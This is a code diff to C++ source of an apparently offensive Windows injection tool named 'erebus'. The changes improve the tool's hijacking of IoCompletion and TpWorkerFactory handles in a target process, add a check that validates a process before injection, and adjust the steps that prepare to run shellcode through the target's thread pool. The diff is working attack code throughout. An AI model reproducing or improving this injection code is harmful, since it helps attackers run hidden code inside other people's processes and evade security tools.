@@ -265,13 +265,13 @@ namespace erebus {
 				continue;
 			}
 
-			// Query object type
-			PP_PUBLIC_OBJECT_TYPE_INFORMATION typeInfo = { 0 };
+			// Query object type - allocate buffer for struct + type name string
+			BYTE typeInfoBuffer[512] = { 0 };
 			status = NtQueryObject(
 				hDuplicated,
 				2, // ObjectTypeInformation
-				&typeInfo,
-				sizeof(typeInfo),
+				typeInfoBuffer,
+				sizeof(typeInfoBuffer),
 				NULL
 			);
 
@@ -280,9 +280,11 @@ namespace erebus {
 				continue;
 			}
 
+			PPP_PUBLIC_OBJECT_TYPE_INFORMATION typeInfo = (PPP_PUBLIC_OBJECT_TYPE_INFORMATION)typeInfoBuffer;
+
 			// Compare type name
-			if (typeInfo.TypeName.Buffer && 
-				wcscmp(typeInfo.TypeName.Buffer, wsObjectType) == 0) {
+			if (typeInfo->TypeName.Buffer && 
+				wcscmp(typeInfo->TypeName.Buffer, wsObjectType) == 0) {
 				LOG_SUCCESS("Found %ls handle: 0x%p", wsObjectType, hDuplicated);
 				free(buffer);
 				return hDuplicated;
@@ -310,6 +312,21 @@ namespace erebus {
 	 */
 	static HANDLE HijackWorkerFactoryHandle(IN HANDLE hTargetProcess) {
 		return HijackProcessHandle(hTargetProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
+	}
+
+	/**
+	 * @brief Check if a process has an active thread pool (IoCompletion handle)
+	 * Used to validate target before injection
+	 * @param hProcess Handle to target process
+	 * @return TRUE if thread pool exists, FALSE otherwise
+	 */
+	BOOL ProcessHasThreadPool(IN HANDLE hProcess) {
+		HANDLE hIoCompletion = HijackProcessHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
+		if (hIoCompletion != NULL) {
+			CloseHandle(hIoCompletion);
+			return TRUE;
+		}
+		return FALSE;
 	}
 
 	// ============================================
@@ -361,20 +378,25 @@ namespace erebus {
 		PVOID shellcodeAddress = NULL;
 		PVOID remoteTpDirectAddress = NULL;
 
-		// Step 1: Resume thread first (it needs to be running for thread pool to work)
-		LOG_INFO("[Step 1/5] Resuming target thread...");
-		ULONG suspendCount = 0;
-		status = NtResumeThread(hThread, &suspendCount);
-		if (!NT_SUCCESS(status)) {
-			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08lX)", status);
-			// Continue anyway, thread might already be running
+		// Step 1: Resume thread first (only needed for suspended processes)
+		LOG_INFO("[Step 1/5] Checking target thread...");
+		if (hThread != NULL && hThread != INVALID_HANDLE_VALUE && (ULONG_PTR)hThread > 1) {
+			ULONG suspendCount = 0;
+			status = NtResumeThread(hThread, &suspendCount);
+			if (!NT_SUCCESS(status)) {
+				LOG_INFO("Thread not suspended or already running");
+			} else {
+				LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspendCount);
+			}
 		} else {
-			LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspendCount);
+			LOG_INFO("Targeting existing process - thread already running");
 		}
 
 		// Step 2: Hijack IoCompletion handle from target process
 		// Retry multiple times as thread pool may take time to initialize
+		// NOTE: Requires Administrator privileges to enumerate handles from protected processes
 		LOG_INFO("[Step 2/5] Hijacking IoCompletion handle from target process...");
+		LOG_INFO("Note: If this fails, try running as Administrator");
 		const int maxRetries = 10;
 		const int retryDelayMs = 500;
 		
